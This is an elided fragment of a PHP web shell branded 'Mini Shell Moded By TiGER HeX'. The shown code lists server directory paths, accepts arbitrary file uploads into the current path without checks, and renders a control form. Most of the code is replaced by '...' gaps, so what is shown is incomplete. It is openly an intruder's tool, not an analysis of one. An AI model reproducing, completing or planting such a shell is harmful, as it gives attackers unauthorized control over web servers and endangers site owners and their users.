...
font-family:Iceland;
">Mini Shell Moded By TiGER HeX</font></center>
...
$i++){ echo "$paths[$i]";
 ...
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="green">Upload Success</font><br />';
...
<input type="submit" value=">">
 ...
 } echo '<center><br/><p>TiGER HeX - Copyright 2K18</p></center>
</body>
</html>';
